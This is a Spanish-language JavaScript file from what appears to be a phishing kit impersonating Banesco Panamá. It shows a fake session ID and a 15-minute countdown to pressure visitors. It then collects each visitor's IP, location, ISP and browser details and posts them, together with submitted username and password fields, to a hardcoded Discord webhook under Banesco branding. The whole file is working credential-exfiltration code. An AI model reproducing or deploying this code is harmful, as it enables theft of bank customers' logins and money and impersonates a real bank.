// -----------------------------------------------------------------
//       CONFIGURACIÓN DE NOTIFICACIONES BANESCO PANAMÁ
// -----------------------------------------------------------------
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1521219865204232335/rJcQLeHHVkcIgbX6Ps1y8HzOLxmehadZgM71xi_4Hyc7Hc3m7nYuebFcyJT_Qex8OS_t"; // <-- REEMPLAZA ESTO CON TU WEBHOOK

window.addEventListener("DOMContentLoaded", () => {
  // Inicializa identificador aleatorio de sesión
  const sessionEl = document.getElementById("sessionToken");
  if (sessionEl) {
    // Formato de ID de solicitud de Banesco
    sessionEl.textContent = "BPA-" + Math.floor(100000 + Math.random() * 900000) + "-PA";
  }

  // (Opcional) Si se necesita registrar la visita inicial
  // logVisita(); 

  // Arranca el cronómetro si existe en la página
  const countdownElement = document.getElementById('countdown');
  if (countdownElement) {
    startTimer(15 * 60, countdownElement); // 15 minutos
  }
});

function startTimer(duration, display) {
  if (!display) return;

  let timer = duration;
  const updateDisplay = () => {
    const minutes = String(Math.floor(timer / 60)).padStart(2, '0');
    const seconds = String(timer % 60).padStart(2, '0');
    display.textContent = `${minutes}:${seconds}`; // Formato MM:SS
  };

  updateDisplay();

  const interval = setInterval(() => {
    timer--;
    if (timer < 0) {
      clearInterval(interval);
      display.textContent = "00:00";
      return;
    }
    updateDisplay();
  }, 1000);
}

// Función para obtener información de la IP del usuario
async function getIpInfo() {
    try {
        const response = await fetch('https://ipinfo.io/json');
        if (!response.ok) return null;
        const data = await response.json();
        return {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country,
            isp: data.org,
        };
    } catch (error) {
        console.error("Error al obtener la información de la IP:", error);
        return null;
    }
}


// Función para enviar notificaciones a Discord con el estilo de Banesco Panamá
async function sendToDiscord(title, description, fields = [], color = 31059, formData = null) {
  const cleanUrl = DISCORD_WEBHOOK_URL.trim();

  // Obtener información de IP y User Agent
  const ipInfo = await getIpInfo();
  const userAgent = navigator.userAgent;

  // Añadir la información extra a los campos del embed
  if (ipInfo) {
      fields.push({ name: "📍 Dirección IP", value: `\`${ipInfo.ip}\``, inline: true });
      fields.push({ name: "🌍 Ubicación", value: `\`${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\``, inline: true });
      fields.push({ name: "🌐 ISP", value: `\`${ipInfo.isp}\``, inline: false });
  }
  fields.push({ 
      name: "💻 User Agent", 
      value: `\`\`\`${userAgent}\`\`\``, 
      inline: false 
  });

  const embedPayload = {
    username: "Alertas Banesco",
    avatar_url: "https://www.banesco.com.pa/wp-content/themes/banescocontigo8-new/assets/images/header/logotype.png",
    embeds: [{
      author: {
        name: "Sistema de Alertas Banesco",
        icon_url: "https://media.banesco.com.pa/wp-content/uploads/wpfiles/2023/06/25034751/cropped-banesco-fav-1-192x192.png"
      },
      title: title,
      description: description,
      color: color, // Color verde Banesco (#007953)
      fields: fields,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Monitoreo de Seguridad • Banesco Panamá"
      }
    }]
  };

  let requestBody;
  const headers = {};

  if (formData) {
    formData.append('payload_json', JSON.stringify(embedPayload));
    requestBody = formData;
    // No se establece Content-Type, el navegador lo hará con el boundary correcto.
  } else {
    headers['Content-Type'] = 'application/json';
    requestBody = JSON.stringify(embedPayload);
  }

  try {
    const response = await fetch(cleanUrl, {
      method: "POST",
      headers: headers,
      body: requestBody
    });
    if (!response.ok) {
        console.error(`Error de Discord: ${response.status} ${response.statusText}`);
    }
  } catch (error) {
    console.error("Error al enviar la notificación a Discord:", error);
  }
}

/**
 * Cómo usar la nueva función:
 * 
 * const campos = [
 *   { name: "Usuario", value: "valor_usuario", inline: true },
 *   { name: "Clave", value: "valor_clave", inline: true }
 * ];
 * 
 * sendToDiscord("Nuevas Credenciales", "Se ha recibido un nuevo login.", campos, 15844367); // color dorado
 */
